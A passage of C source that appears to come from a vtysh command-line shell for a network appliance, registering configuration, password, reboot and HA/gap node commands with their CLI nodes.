	install_element(CONFIG_NODE, &no_vtysh_log_record_priority_cmd);
	install_element(CONFIG_NODE, &vtysh_log_timestamp_precision_cmd);
	install_element(CONFIG_NODE, &no_vtysh_log_timestamp_precision_cmd);

	install_element(CONFIG_NODE, &vtysh_service_password_encrypt_cmd);
	install_element(CONFIG_NODE, &no_vtysh_service_password_encrypt_cmd);

	install_element(CONFIG_NODE, &vtysh_password_cmd);
	install_element(CONFIG_NODE, &vtysh_password_text_cmd);
	install_element(CONFIG_NODE, &vtysh_enable_password_cmd);
	install_element(CONFIG_NODE, &vtysh_enable_password_text_cmd);
	install_element(CONFIG_NODE, &no_vtysh_enable_password_cmd);


	install_node(&app_node, NULL);
	install_node(&ha_node, NULL);
	install_node(&gap_outer_node, NULL);
	install_node(&gap_inner_node, NULL);
	install_node(&gap_arbiter_node, NULL);

	vtysh_install_default(APP_NODE);
	vtysh_install_default(HA_NODE);
	vtysh_install_default(GAP_INNER_NODE);
	vtysh_install_default(GAP_OUTER_NODE);
	vtysh_install_default(GAP_ARBITER_NODE);

	install_element(APP_NODE, &vtysh_end_all_cmd);
	install_element(HA_NODE, &vtysh_end_all_cmd);
	install_element(HA_NODE, &vtysh_exit_ha_cmd);
	install_element(HA_NODE, &vtysh_quit_ha_cmd);
	install_element(GAP_INNER_NODE, &vtysh_end_all_cmd);
	install_element(GAP_INNER_NODE, &vtysh_exit_app_cmd);
	install_element(GAP_INNER_NODE, &vtysh_quit_app_cmd);
	install_element(GAP_ARBITER_NODE, &vtysh_end_all_cmd);
	install_element(GAP_ARBITER_NODE, &vtysh_exit_app_cmd);
	install_element(GAP_ARBITER_NODE, &vtysh_quit_app_cmd);
	install_element(GAP_OUTER_NODE, &vtysh_end_all_cmd);
	install_element(GAP_OUTER_NODE, &vtysh_exit_app_cmd);
	install_element(GAP_OUTER_NODE, &vtysh_quit_app_cmd);

	install_element(CONFIG_NODE, &vtysh_reset_config_cmd);
	install_element(CONFIG_NODE, &app_enter_cmd);
	install_element(CONFIG_NODE, &ha_enter_cmd);
	install_element(CONFIG_NODE, &gap_outer_enter_cmd);
	install_element(CONFIG_NODE, &gap_inner_enter_cmd);
	install_element(CONFIG_NODE, &gap_arbiter_enter_cmd);


	install_element(CONFIG_NODE, &config_reboot_cmd);
	install_element(ENABLE_NODE, &config_reboot_cmd);

	install_element(CONFIG_NODE, &config_fw_user_cmd);
	install_element(GAP_INNER_NODE, &vtysh_interface_cmd);
	install_element(GAP_OUTER_NODE, &vtysh_interface_cmd);

	install_element(ENABLE_NODE, &vtysh_set_login_info_cmd);
}
